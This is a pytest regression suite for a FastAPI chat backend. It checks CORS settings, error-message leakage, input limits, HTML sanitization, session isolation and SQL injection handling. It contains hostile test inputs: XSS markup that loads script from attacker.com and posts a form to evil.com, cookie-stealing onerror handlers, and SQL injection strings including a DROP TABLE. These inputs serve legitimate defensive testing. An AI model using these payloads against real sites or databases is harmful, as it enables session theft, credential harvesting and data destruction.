"""
Automated Security Engineering Regression Test Suite.
Verifies defensive controls for:
1. CORS origin controls and credential security
2. Information disclosure prevention in error responses
3. Request validation bounds (DoS mitigation)
4. HTML sanitization, script blocking, and CSP injection
5. Cross-session data isolation
6. SQL injection resistance via parameterized ORM queries
"""
import pytest
from fastapi.testclient import TestClient
from backend.app.main import app
from backend.app.core.config import settings
from backend.app.services.artifact_service import artifact_service
from backend.app.db.session import SessionLocal
from backend.app.db.models import SessionModel, MessageModel

client = TestClient(app)

def test_cors_origin_and_credential_hardening():
    """Verifies that CORS origins are explicitly defined and not insecure wildcard with credentials."""
    # Settings must not have '*' in allowed origins by default
    assert "*" not in settings.CORS_ORIGINS
    
    # Preflight test with trusted origin
    res = client.options(
        "/api/v1/chat",
        headers={
            "Origin": "http://localhost:5173",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "content-type"
        }
    )
    assert res.status_code == 200
    assert res.headers.get("access-control-allow-origin") == "http://localhost:5173"
    assert res.headers.get("access-control-allow-credentials") == "true"

def test_no_sensitive_exception_leaks_in_production():
    """Verifies that unhandled server exceptions do not expose raw tracebacks or str(exc) in production."""
    # When DEBUG is False (default)
    assert settings.DEBUG is False
    
    # Trigger an exception handler via a non-existent or forced error
    # Test client calling root exception handler
    with pytest.MonkeyPatch.context() as mp:
        def mock_error(*args, **kwargs):
            raise RuntimeError("Database connection string postgres://secret_user:super_secret_pw@internal.db:5432/db")
        
        from backend.app.services.agent_service import agent_service
        mp.setattr(agent_service, "process_chat", mock_error)
        
        response = client.post("/api/v1/chat", json={"message": "Hello"})
        assert response.status_code == 500
        body = response.json()
        assert "super_secret_pw" not in str(body)
        assert "internal.db" not in str(body)
        assert body.get("detail") == "Chat processing encountered an unexpected internal error."

def test_request_validation_and_length_limits():
    """Verifies that oversized inputs are rejected with 422 Unprocessable Entity to mitigate DoS."""
    # 1. Chat message exceeding 10,000 characters
    oversized_message = "A" * 10001
    res = client.post("/api/v1/chat", json={"message": oversized_message})
    assert res.status_code == 422
    assert "string_too_long" in str(res.json())

    # 2. Session ID exceeding 100 characters
    oversized_session = "s" * 101
    res = client.post("/api/v1/chat", json={"session_id": oversized_session, "message": "Valid prompt"})
    assert res.status_code == 422

    # 3. Ship30 word count out of bounds (> 5000)
    res = client.post("/api/v1/ship30/generate", json={
        "session_id": "test-session",
        "topic": "Valid Topic",
        "target_word_count": 99999
    })
    assert res.status_code == 422

    # 4. Ingest max_episodes out of bounds (> 100)
    res = client.post("/api/v1/ingest", json={"max_episodes": 9999})
    assert res.status_code == 422

def test_html_sanitization_defense_in_depth():
    """Verifies that all malicious script execution vectors and base tag hijacking are neutralized."""
    malicious_payload = (
        '<div>'
        '<h1>Growth Dashboard</h1>'
        '<script>alert("xss")</script>'
        '<script src="https://attacker.com/evil.js">'  # unclosed script tag
        '<img src="valid.png" onerror="alert(document.cookie)">'
        '<a href="javascript:stealTokens()">Click here</a>'
        '<a href="vbscript:msgbox(1)">VBScript link</a>'
        '<iframe src="https://evil.com"></iframe>'
        '<base href="https://phishing.com/">'
        '<link rel="stylesheet" href="http://evil.com/style.css">'
        '<form action="https://evil.com/harvest"><input name="cred"/></form>'
        '</div>'
    )
    
    clean = artifact_service.sanitize_and_isolate_html(malicious_payload, "Security Audit Artifact")
    
    # 1. Scripts must be completely stripped
    assert "<script" not in clean.lower()
    assert "</script>" not in clean.lower()
    assert "attacker.com/evil.js" not in clean
    
    # 2. Inline event handlers must be stripped
    assert "onerror=" not in clean.lower()
    assert "alert(document.cookie)" not in clean
    
    # 3. Dangerous URIs must be stripped
    assert "javascript:" not in clean.lower()
    assert "vbscript:" not in clean.lower()
    
    # 4. Dangerous embedding elements must be stripped
    assert "<iframe" not in clean.lower()
    assert "<base" not in clean.lower()
    assert "<form" not in clean.lower()
    assert "<link" not in clean.lower()
    
    # 5. Safe CSP meta tag must be present
    assert 'http-equiv="Content-Security-Policy"' in clean
    assert "default-src 'none'" in clean

def test_cross_session_data_isolation():
    """Verifies that conversation data cannot leak across different session IDs."""
    db = SessionLocal()
    try:
        # Create Session 1
        s1 = SessionModel(id="sec-session-1", title="Confidential Growth Strategy")
        m1 = MessageModel(
            id="msg-1",
            session_id="sec-session-1",
            role="user",
            content="Confidential acquisition numbers for Q3"
        )
        # Create Session 2
        s2 = SessionModel(id="sec-session-2", title="Public Strategy")
        m2 = MessageModel(
            id="msg-2",
            session_id="sec-session-2",
            role="user",
            content="General public growth frameworks"
        )
        db.add_all([s1, m1, s2, m2])
        db.commit()

        # Fetch messages for Session 2
        res = client.get("/api/v1/sessions/sec-session-2/messages")
        assert res.status_code == 200
        msgs = res.json()
        assert len(msgs) == 1
        assert msgs[0]["id"] == "msg-2"
        assert "Confidential" not in msgs[0]["content"]

        # Attempt to access non-existent session
        res404 = client.get("/api/v1/sessions/non-existent-session/messages")
        assert res404.status_code == 404

        # Clean up
        db.delete(m1)
        db.delete(m2)
        db.delete(s1)
        db.delete(s2)
        db.commit()
    finally:
        db.close()

def test_sql_injection_resilience():
    """Verifies that SQL injection payloads in path parameters and queries are safely parameterized."""
    sqli_payloads = [
        "' OR '1'='1",
        "'; DROP TABLE sessions; --",
        "1' UNION SELECT 1, 'admin', 'pass', '2026-01-01', '2026-01-01', '{}' --",
        "admin'--",
    ]
    
    for payload in sqli_payloads:
        # Test session detail endpoint with SQLi payload in ID
        res = client.get(f"/api/v1/sessions/{payload}")
        # Should be a clean 404 (Not Found) or 422, never a 500 SQL syntax error
        assert res.status_code in [404, 422]
        assert "syntax error" not in str(res.json()).lower()
